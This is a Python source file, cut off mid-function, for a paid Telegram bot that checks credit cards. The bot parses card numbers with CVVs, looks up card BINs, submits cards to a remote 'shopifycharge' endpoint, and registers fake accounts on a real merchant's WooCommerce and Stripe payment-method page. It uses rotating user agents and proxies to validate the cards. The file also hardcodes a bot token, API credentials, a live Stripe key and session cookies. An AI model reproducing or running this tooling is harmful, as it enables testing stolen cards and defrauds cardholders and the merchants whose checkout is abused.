from telethon import TelegramClient, events, Button
import uuid
import urllib3
import asyncio
import aiohttp
import aiofiles
import os
import requests
import random
import time
import json
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from fake_useragent import UserAgent
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# منع تكرار الردود
import logging
logging.getLogger("telethon").setLevel(logging.WARNING)

# ==================== AUTO WORKERS SYSTEM ====================
import asyncio
import time
import os
from typing import Optional

class AutoWorkerManager:
    def __init__(self, max_workers=75, min_workers=10):
        self.max_workers = max_workers
        self.min_workers = min_workers
        self.current_workers = max_workers
        self.semaphore = asyncio.Semaphore(max_workers)
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.active_tasks = set()
        self.results = []
        self.lock = asyncio.Lock()
        
        self.task_times = []
        self.error_count = 0
        self.success_count = 0
        self.last_adjust_time = time.time()
        self.adjust_interval = 10
        
        self.running = True
        self.monitor_task = None
        
    async def start_monitor(self):
        self.running = True
        while self.running:
            await asyncio.sleep(self.adjust_interval)
            await self._adjust_workers()
    
    async def _adjust_workers(self):
        try:
            cpu_count = os.cpu_count() or 4
            try:
                load_avg = os.getloadavg()
                cpu_percent = min(100, (load_avg[0] / cpu_count) * 100)
            except:
                cpu_percent = 50
            
            try:
                import resource
                mem_usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / (1024 * 1024)
                memory_percent = min(100, (mem_usage / 1024) * 100)
            except:
                memory_percent = 50
            
            avg_time = 0
            if self.task_times:
                avg_time = sum(self.task_times[-50:]) / len(self.task_times[-50:])
            
            total = self.success_count + self.error_count
            success_rate = (self.success_count / total * 100) if total > 0 else 100
            
            new_workers = self.current_workers
            
            if cpu_percent > 80 or memory_percent > 85:
                new_workers = max(self.min_workers, int(self.current_workers * 0.7))
                print(f"⚠️ High load: CPU={cpu_percent:.1f}%, RAM={memory_percent:.1f}% → Workers: {self.current_workers} → {new_workers}")
            
            elif success_rate < 70:
                new_workers = max(self.min_workers, int(self.current_workers * 0.8))
                print(f"⚠️ High errors: {success_rate:.1f}% success → Workers: {self.current_workers} → {new_workers}")
            
            elif avg_time > 5.0:
                new_workers = max(self.min_workers, int(self.current_workers * 0.8))
                print(f"⚠️ Slow tasks: {avg_time:.2f}s avg → Workers: {self.current_workers} → {new_workers}")
            
            elif cpu_percent < 30 and memory_percent < 50 and success_rate > 90:
                new_workers = min(self.max_workers, int(self.current_workers * 1.2))
                print(f"✅ Low load: CPU={cpu_percent:.1f}%, RAM={memory_percent:.1f}% → Workers: {self.current_workers} → {new_workers}")
            
            if new_workers != self.current_workers:
                self.current_workers = new_workers
                self.semaphore = asyncio.Semaphore(new_workers)
                self.executor = ThreadPoolExecutor(max_workers=new_workers)
                print(f"⚡ Workers adjusted: {new_workers}")
            
        except Exception as e:
            print(f"❌ Auto adjust error: {e}")
    
    async def run_task(self, func, *args, **kwargs):
        start_time = time.time()
        
        async with self.semaphore:
            try:
                if asyncio.iscoroutinefunction(func):
                    result = await func(*args, **kwargs)
                else:
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(self.executor, func, *args, **kwargs)
                
                self.success_count += 1
                elapsed = time.time() - start_time
                self.task_times.append(elapsed)
                
                if len(self.task_times) > 100:
                    self.task_times = self.task_times[-100:]
                
                return result
                
            except Exception as e:
                self.error_count += 1
                raise e
    
    async def run_batch(self, tasks_data):
        self.results = []
        batch_size = self.current_workers
        total_tasks = len(tasks_data)
        
        for i in range(0, total_tasks, batch_size):
            batch = tasks_data[i:i+batch_size]
            async_tasks = []
            for task_info in batch:
                func = task_info['func']
                args = task_info.get('args', [])
                kwargs = task_info.get('kwargs', {})
                async_tasks.append(self.run_task(func, *args, **kwargs))
            
            batch_results = await asyncio.gather(*async_tasks, return_exceptions=True)
            for result in batch_results:
                if isinstance(result, Exception):
                    self.results.append({'status': 'Error', 'message': str(result)})
                else:
                    self.results.append(result)
        
        return self.results
    
    def shutdown(self):
        self.running = False
        self.executor.shutdown(wait=False)
    
    def get_status(self):
        cpu_count = os.cpu_count() or 4
        try:
            load_avg = os.getloadavg()
            cpu_percent = min(100, (load_avg[0] / cpu_count) * 100)
        except:
            cpu_percent = 50
        
        try:
            import resource
            mem_usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / (1024 * 1024)
            memory_percent = min(100, (mem_usage / 1024) * 100)
        except:
            memory_percent = 50
        
        total = self.success_count + self.error_count
        success_rate = (self.success_count / total * 100) if total > 0 else 100
        
        avg_time = 0
        if self.task_times:
            avg_time = sum(self.task_times[-20:]) / len(self.task_times[-20:]) if self.task_times else 0
        
        return {
            'current_workers': self.current_workers,
            'max_workers': self.max_workers,
            'min_workers': self.min_workers,
            'cpu_percent': cpu_percent,
            'memory_percent': memory_percent,
            'success_rate': success_rate,
            'avg_task_time': avg_time,
            'total_tasks': total,
            'active_tasks': len(self.active_tasks)
        }

# إنشاء مدير العمال التلقائي
worker_manager = AutoWorkerManager(max_workers=75, min_workers=10)

# ==================== الإعدادات ====================
API_ID = 6760880
API_HASH = "2d97eaf5bf0fe70569b83478b366b715"
BOT_TOKEN = '8809978840:AAFSxz1lnvl5EhYN2HUP_Z8n9MznZIXTdB4'
ADMIN_ID = [7695426704]
CHECKER_API_URL = 'http://181.214.136.123:9094/shopifycharge'

# NexaHome Stripe Checker Config
NEXA_BASE_URL = "https://nexahomesg.com"
NEXA_STRIPE_PK = "pk_live_51S62OSEIzolvLrOUgHqumhvUG1kcUp3mqXTb6djO6rTXtQnrk5G4kVDrSbgo6XjlhVTc3Kyi2ZFgrAX7FPwCYU9l00X7qnJNc2"
STRIPE_API = "https://api.stripe.com/v1"
NEXA_DEV_NAME = "@E3_BC"
NEXA_DELAY = 4

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ==================== الملفات والإعدادات ====================
PREMIUM_USERS_FILE = "premium_users.txt"
PREMIUM_EXPIRY_FILE = "premium_expiries.json"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
USER_PROXY_DIR = "user_proxies"
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
STARS_PAYMENTS_FILE = "stars_payments.json"
BANNED_USERS_FILE = "banned_users.txt"
USERS_FILE = "users.txt"

os.makedirs(USER_PROXY_DIR, exist_ok=True)

STARS_PRICES = {
    "1h": {"title": "1 Hour", "stars": 10, "hours": 1},
    "1d": {"title": "1 Day", "stars": 30, "hours": 24},
    "7d": {"title": "1 Week", "stars": 100, "hours": 24 * 7},
}

DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "All Sites", "min": 0, "max": 999999, "all": True}
]

# ==================== نظام إدارة الفحوصات ====================
active_scans = {}
SCAN_COUNTER = 0
SCAN_ID_PREFIX = "SCAN"

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📢": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐": "5172716095697584957",
    "🆓": "5406756500108501710", "🔑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🛒": "5447311106030726740",
    "👤": "5445174334031166029", "🔄": "5454245266305604993", "🦦": "5445408306669582934",
    "🥰": "5444931419270839381", "😱": "5447181973544008180", "🔗": "5258024802010026053",
    "🔐": "5454386656628991407", "📁": "5343927661213279013", "⃣": "5454371323595744068",
    "🥵": "5447653032672129347", "➡️": "5445350109862720603", "🦉": "5123344136665039833",
    "🍑": "5445408306669582934", "💪": "5305622454218024328", "🌝": "5341684837881235158",
    "📄": "5444908424015934570", "ℹ️": "5289930378885214069", "💀": "5231338559587257737",
    "📢": "5116445341150872576", "💰": "5116648080787112958", "🔘": "5219901967916084166",
    "🔹": "5447479640547428304", "👇": "5122933683820430249", "📌": "5447187153274567373",
    "🍳": "5305622454218024328", "💸": "5283232570660634549", "🎉": "5172632227871196306",
    "🎁": "5283031441637148958", "🚫": "5116151848855667552", "🛑": "5447319442562251569",
    "🧠": "4904936030232117798", "⛔": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡️": "5219672809936006424", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "📹": "5445158077579952110", "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔮": "5258476306152038031", "😇": "6321225560789877992",
    "👌": "5445350109862720603", "⭐": "6267298050205553492", "🍭": "6267152480878990865",
    "♟️": "5258023599419171861", "⛏": "4918014360267260850", "📥": "5350747347724810871",
    "💵": "5350711759625795085", "🏷️": "5436285465420383204", "📂": "5444908424015934570",
    "🛠️": "5348239232852836489", "📄": "5323538339062628165",
}

FLAGS = {
    'US': '🇺🇸', 'GB': '🇬🇧', 'EG': '🇪🇬', 'FR': '🇫🇷', 'DE': '🇩🇪',
    'IT': '🇮🇹', 'ES': '🇪🇸', 'RU': '🇷🇺', 'CN': '🇨🇳', 'JP': '🇯🇵',
    'IN': '🇮🇳', 'BR': '🇧🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'CA': '🇨🇦',
    'AU': '🇦🇺', 'NZ': '🇳🇿', 'ZA': '🇿🇦', 'NG': '🇳🇬', 'KE': '🇰🇪'
}

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
]

BASE_COOKIES = {
    'tk_ai': 'wuvKCq8MSo8TXuI3RECgfRwI',
    '_tccl_visitor': '66bff119-f363-4dbf-9a54-d30cb2f88d81',
    '__stripe_mid': 'e07abe15-8b62-4b37-a523-b076a88f9eb366b2a5',
    '__cf_bm': 'IGFvNN.UtEUbEo1WcN4TEIyIPJVzlR2Kst8oJhoGvC8-1787345529.2018843-1.0.1.1-NjhZDqIxVpoo4l_OERrVwa0V.H092K.oKZmsEqzRW49DafxUPie1RXYxQs9s6JFj4UxFSz3mudvUysyJLJDZtXBQ362xBxhvaI5a29ZE4RCmRIvSdXx3tUnA95y_tK8F',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def generate_scan_id():
    global SCAN_COUNTER
    SCAN_COUNTER += 1
    return f"{SCAN_ID_PREFIX}_{SCAN_COUNTER}_{int(time.time())}"

def get_active_scans():
    scans = []
    for user_id, data in active_scans.items():
        if isinstance(data, dict):
            scans.append({
                'user_id': user_id,
                'scan_id': data.get('scan_id', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'total': data.get('total', 0),
                'processed': data.get('processed', 0),
                'start_time': data.get('start_time', time.time()),
                'status': 'Running' if not data.get('stop_flag', False) else 'Stopping'
            })
    return scans

async def stop_scan_by_id(scan_id, admin_id):
    for user_id, data in active_scans.items():
        if isinstance(data, dict) and data.get('scan_id') == scan_id:
            data['stop_flag'] = True
            data['stopped_by'] = admin_id
            data['stopped_at'] = time.time()
            return True, user_id, data
    return False, None, None

async def notify_user_scan_stopped(user_id, scan_id, admin_id):
    try:
        admin_name = f"Admin {admin_id}"
        try:
            admin_user = await bot.get_entity(admin_id)
            admin_name = f"@{admin_user.username}" if admin_user.username else f"Admin {admin_id}"
        except:
            pass
        
        await bot.send_message(
            user_id,
            premium_emoji(f"""⏹️ <b>Sсаη Sтσρρed Bу A∂мιη</b>

📌 Sсаη ID: <code>{scan_id}</code>
👤 Sтσρρed Bу: {admin_name}
⏱️ Tιмe: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ Yσυr sсаη нαs вεeη sтσρρed вy α∂мιηιsтrαтσr.
PƖeαse cσηтαcт α∂мιη ƒσr мσre ιηƒσrmαтιση."""),
            parse_mode='html'
        )
    except:
        pass

TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}
COLLECT_DATA = {}
COLLECT_TIMERS = {}
MERGE_DATA = {}
MERGE_TIMERS = {}
HITS_CHANNEL_ID = 0
BOT_RESTART_TIME = datetime.now()

# ==================== BAN SYSTEM ====================

def load_banned_users():
    if not os.path.exists(BANNED_USERS_FILE):
        return []
    try:
        with open(BANNED_USERS_FILE, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_banned_users(banned_list):
    with open(BANNED_USERS_FILE, 'w', encoding='utf-8') as f:
        for uid in banned_list:
            f.write(f"{uid}\n")

def is_banned(user_id):
    return str(user_id) in load_banned_users()

def ban_user(user_id):
    banned = load_banned_users()
    uid_str = str(user_id)
    if uid_str not in banned:
        banned.append(uid_str)
        save_banned_users(banned)
        return True
    return False

def unban_user(user_id):
    banned = load_banned_users()
    uid_str = str(user_id)
    if uid_str in banned:
        banned.remove(uid_str)
        save_banned_users(banned)
        return True
    return False

# ==================== USER TRACKING ====================

def save_user(user_id, username=None, first_name=None):
    users = load_users()
    uid_str = str(user_id)
    if uid_str not in users:
        users[uid_str] = {
            'first_seen': datetime.now().isoformat(),
            'username': username,
            'first_name': first_name
        }
        save_users_file(users)
        return True
    return False

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users_file(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

def get_user_count():
    return len(load_users())

# ==================== دوال بروكسيات المستخدمين ====================

def get_user_proxy_file(user_id):
    return os.path.join(USER_PROXY_DIR, f"proxy_{user_id}.txt")

def load_user_proxies(user_id):
    file_path = get_user_proxy_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        return []

def save_user_proxies(user_id, proxies):
    file_path = get_user_proxy_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

def add_user_proxy(user_id, proxy):
    proxies = load_user_proxies(user_id)
    if proxy not in proxies:
        proxies.append(proxy)
        save_user_proxies(user_id, proxies)
        return True
    return False

def remove_user_proxy(user_id, proxy):
    proxies = load_user_proxies(user_id)
    if proxy in proxies:
        proxies.remove(proxy)
        save_user_proxies(user_id, proxies)
        return True
    return False

def clear_user_proxies(user_id):
    file_path = get_user_proxy_file(user_id)
    if os.path.exists(file_path):
        os.remove(file_path)
        return True
    return False

def get_user_proxy_count(user_id):
    return len(load_user_proxies(user_id))

# ==================== الدوال الأساسية ====================

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴏᴍ", b"show_cmds", style="primary"),
         Button.inline(" Tᴏᴏls", b"tools_menu", style="primary")],
        [Button.inline(" Bᴜʏ Pʀᴇᴍɪᴜᴍ", b"stars_shop", style="success")],
        [Button.url(" Cнᴀɴɴᴇʟ", "https://t.me/+hbHg2rn2NyI0ZWRk", style="success")]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel", style="success")])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

async def send_stars_invoice(user_id, plan_id):
    plan = STARS_PRICES.get(plan_id)
    if not plan:
        return False
    payload = f"premium_stars:{plan_id}"
    
    result = await telegram_api("sendInvoice", {
        "chat_id": str(user_id),
        "title": f"⭐ Premium - {plan['title']}",
        "description": f"Premium access for {plan['title']}.",
        "payload": payload,
        "provider_token": "",
        "currency": "XTR",
        "prices": json.dumps([{
            "label": f"Premium {plan['title']}",
            "amount": plan["stars"]
        }]),
        "start_parameter": f"premium-{plan_id}",
    }, timeout=600)
    return bool(result.get("ok"))

async def stars_payment_worker():
    offset = 0
    print("🌟 Stars payment worker started!")
    while True:
        try:
            result = await telegram_api("getUpdates", {
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps([
                    "pre_checkout_query",
                    "message"
                ])
            })
            
            if not result.get("ok"):
                print(f"⚠️ getUpdates error: {result.get('description', 'Unknown')}")
                await asyncio.sleep(3)
                continue
                
            updates = result.get("result", [])
            if updates:
                print(f"📨 Received {len(updates)} updates")
                
            for update in updates:
                offset = update["update_id"] + 1
                
                pre = update.get("pre_checkout_query")
                if pre:
                    print(f"💳 Pre-checkout: {pre.get('id')}")
                    payload = pre.get("invoice_payload", "")
                    plan_id = payload.replace("premium_stars:", "", 1)
                    plan = STARS_PRICES.get(plan_id)
                    valid = (
                        bool(plan)
                        and pre.get("currency") == "XTR"
                        and int(pre.get("total_amount", -1)) == plan["stars"]
                    )
                    
                    await telegram_api("answerPreCheckoutQuery", {
                        "pre_checkout_query_id": pre["id"],
                        "ok": "true" if valid else "false",
                        **({} if valid else {
                            "error_message": "This order is invalid. Please try again."
                        })
                    })
                    continue
                    
                message = update.get("message") or {}
                successful = message.get("successful_payment")
                
                if not successful:
                    continue
                    
                print("✅ Successful payment detected!")
                payload = successful.get("invoice_payload", "")
                plan_id = payload.replace("premium_stars:", "", 1)
                plan = STARS_PRICES.get(plan_id)
                user = message.get("from") or {}
                user_id = user.get("id")
                
                if not plan:
                    print(f"⚠️ Invalid plan: {plan_id}")
                    continue
                    
                if not user_id:
                    print("⚠️ No user_id found")
                    continue
                    
                if successful.get("currency") != "XTR":
                    print(f"⚠️ Wrong currency: {successful.get('currency')}")
                    continue
                    
                if int(successful.get("total_amount", -1)) != plan["stars"]:
                    print(f"⚠️ Wrong amount: {successful.get('total_amount')} != {plan['stars']}")
                    continue
                    
                charge_id = successful.get("telegram_payment_charge_id")
                payments = load_stars_payments()
                
                if charge_id and charge_id in payments:
                    print(f"⚠️ Duplicate payment: {charge_id}")
                    continue
                    
                expiry = datetime.now() + timedelta(hours=plan["hours"])
                add_premium_user(user_id, expiry)
                
                if charge_id:
                    payments[charge_id] = {
                        "user_id": str(user_id),
                        "plan": plan_id,
                        "stars": plan["stars"],
                        "activated_at": datetime.now().isoformat(),
                        "expires_at": expiry.isoformat()
                    }
                    save_stars_payments(payments)
                    
                expiry_text = expiry.strftime("%Y-%m-%d %H:%M")
                await telegram_api("sendMessage", {
                    "chat_id": str(user_id),
                    "text": premium_emoji(
                        f"🎉 Payment Successful!\n\n"
                        f"⭐ Premium: {plan['title']}\n"
                        f"💰 Paid: {plan['stars']} ⭐\n"
                        f"🔄 Expires: {expiry_text}\n\n"
                        f"✅ Enjoy your premium access!"
                    ),
                    "parse_mode": "HTML"
                })
                
                print(f"✅ Premium activated for user {user_id} - {plan['title']}")
                
        except asyncio.CancelledError:
            print("🛑 Stars payment worker stopped")
            raise
        except Exception as e:
            print(f"❌ Stars payment worker error: {e}")
            import traceback
            traceback.print_exc()
            await asyncio.sleep(5)

async def telegram_api(method, data=None, timeout=600):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    timeout_obj = aiohttp.ClientTimeout(total=timeout)
    async with aiohttp.ClientSession(timeout=timeout_obj) as session:
        async with session.post(url, data=data or {}) as resp:
            return await resp.json(content_type=None)

def load_stars_payments():
    if not os.path.exists(STARS_PAYMENTS_FILE):
        return {}
    try:
        with open(STARS_PAYMENTS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except:
        return {}

def save_stars_payments(data):
    with open(STARS_PAYMENTS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users:
                        f.write(f"{u}\n")
        return users
    except:
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    proxies = get_file_lines(PROXY_FILE)
    cleaned = []
    for p in proxies:
        p = p.strip()
        if p and not p.startswith('#') and not p.startswith('//'):
            cleaned.append(p)
    return cleaned

def load_premium_expiries():
    if not os.path.exists(PREMIUM_EXPIRY_FILE):
        return {}
    try:
        with open(PREMIUM_EXPIRY_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except:
        return {}

def save_premium_expiries(expiries):
    with open(PREMIUM_EXPIRY_FILE, 'w', encoding='utf-8') as f:
        json.dump(expiries, f, indent=4)

def is_premium(user_id):
    user_id_str = str(user_id)
    
    if is_banned(user_id_str):
        return False
    
    if user_id_str in [str(admin) for admin in ADMIN_ID]:
        return True
    premium_users = load_premium_users()
    if user_id_str not in premium_users:
        return False
    expiries = load_premium_expiries()
    expiry_raw = expiries.get(user_id_str)
    if not expiry_raw:
        return True
    try:
        expiry = datetime.fromisoformat(expiry_raw)
    except:
        return False
    if datetime.now() >= expiry:
        premium_users.remove(user_id_str)
        with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
            for uid in premium_users:
                f.write(f"{uid}\n")
        expiries.pop(user_id_str, None)
        save_premium_expiries(expiries)
        return False
    return True

def add_premium_user(user_id, expires_at=None):
    user_id_str = str(user_id)
    premium_users = load_premium_users()
    if user_id_str not in premium_users:
        premium_users.append(user_id_str)
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                f.write(f"{uid}\n")
    else:
        return False
    if expires_at is not None:
        expiries = load_premium_expiries()
        expiries[user_id_str] = expires_at.isoformat()
        save_premium_expiries(expiries)
    return True

def remove_premium_user(user_id):
    user_id_str = str(user_id)
    premium_users = load_premium_users()
    removed = False
    if user_id_str in premium_users and user_id_str not in [str(admin) for admin in ADMIN_ID]:
        premium_users.remove(user_id_str)
        removed = True
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                f.write(f"{uid}\n")
    expiries = load_premium_expiries()
    if user_id_str in expiries:
        expiries.pop(user_id_str, None)
        save_premium_expiries(expiries)
    return removed

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"FBD×{random_part}"

def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def get_flag(code):
    return FLAGS.get(str(code).upper(), '🏳️')

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

# ==================== NexaHome Stripe Checker ====================

class NexaHomeStripeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        
        self.cookies = {}
        self.stripe_pk = NEXA_STRIPE_PK
        self.stripe_acct = None
        self.add_nonce = None
        self.register_nonce = None
        self.afreg_nonce = None
        self.guid = f"a476acea-d58c-4f2c-9e6d-8ea49c13cfe4{''.join(random.choices('abcdef0123456789', k=6))}"
        self.muid = None
        self.sid = None
        self.account_created = False
        
    def _ua(self):
        return random.choice(USER_AGENTS)
    
    def _delay(self, seconds=NEXA_DELAY):
        time.sleep(random.uniform(seconds * 0.8, seconds * 1.2))
    
    def _get_register_nonces(self):
        try:
            headers = {
                'authority': 'nexahomesg.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': self._ua(),
            }
            response = self.session.get(f'{NEXA_BASE_URL}/my-account/', headers=headers, timeout=15)
            self.cookies.update(self.session.cookies.get_dict())
            if response.status_code != 200:
                return False
            
            html = response.text
            reg_nonce = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', html)
            if reg_nonce:
                self.register_nonce = reg_nonce.group(1)
            
            afreg_nonce = re.search(r'name="afreg_nonce_field"[^>]*value="([^"]+)"', html)
            if afreg_nonce:
                self.afreg_nonce = afreg_nonce.group(1)
            
            return True
        except:
            return False
    
    def register_account(self):
        try:
            if not self._get_register_nonces():
                return False
            if not self.register_nonce:
                return False
            
            username = f"user{random.randint(1000,9999)}"
            email = f"{username}@gmail.com"
            
            headers = {
                'authority': 'nexahomesg.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'origin': NEXA_BASE_URL,
                'referer': f'{NEXA_BASE_URL}/my-account/',
                'user-agent': self._ua(),
            }
            
            files = [
                ('afreg_nonce_field', (None, self.afreg_nonce or '')),
                ('_wp_http_referer', (None, '/my-account/')),
                ('billing_first_name', (None, username)),
                ('billing_last_name', (None, username)),
                ('username', (None, username)),
                ('email', (None, email)),
                ('afreg_additional_7385', (None, 'test address')),
                ('wc_order_attribution_source_type', (None, 'typein')),
                ('wc_order_attribution_referrer', (None, f'{NEXA_BASE_URL}/my-account/payment-methods/')),
                ('wc_order_attribution_utm_campaign', (None, '(none)')),
                ('wc_order_attribution_utm_source', (None, '(direct)')),
                ('wc_order_attribution_utm_medium', (None, '(none)')),
                ('wc_order_attribution_utm_content', (None, '(none)')),
                ('wc_order_attribution_utm_id', (None, '(none)')),
                ('wc_order_attribution_utm_term', (None, '(none)')),
                ('wc_order_attribution_utm_source_platform', (None, '(none)')),
                ('wc_order_attribution_utm_creative_format', (None, '(none)')),
                ('wc_order_attribution_utm_marketing_tactic', (None, '(none)')),
                ('wc_order_attribution_session_entry', (None, f'{NEXA_BASE_URL}/my-account/')),
                ('wc_order_attribution_session_start_time', (None, datetime.now().strftime('%Y-%m-%d %H:%M:%S'))),
                ('wc_order_attribution_session_pages', (None, '3')),
                ('wc_order_attribution_session_count', (None, '1')),
                ('wc_order_attribution_user_agent', (None, self._ua())),
                ('woocommerce-register-nonce', (None, self.register_nonce)),
                ('_wp_http_referer', (None, '/my-account/')),
                ('register', (None, 'Register')),
            ]
            
            response = self.session.post(
                f'{NEXA_BASE_URL}/my-account/',
                cookies=self.cookies,
                headers=headers,
                files=files,
                timeout=20
            )
            self.cookies.update(self.session.cookies.get_dict())
            
            if "logout" in response.text.lower() or "Dashboard" in response.text or "my-account" in response.url:
                self.account_created = True
                return True
            return False
        except:
            return False
    
    def get_payment_page_data(self):
        try:
            headers = {
                'authority': 'nexahomesg.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'referer': f'{NEXA_BASE_URL}/my-account/payment-methods/',
                'user-agent': self._ua(),
            }
            
            response = self.session.get(
                f'{NEXA_BASE_URL}/my-account/add-payment-method/',
                headers=headers,
                timeout=15
            )
            self.cookies.update(self.session.cookies.get_dict())
            html = response.text
            
            pk_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
            if pk_match:
                self.stripe_pk = pk_match.group(1)
            
            acct_match = re.search(r'(acct_[A-Za-z0-9_-]+)', html)
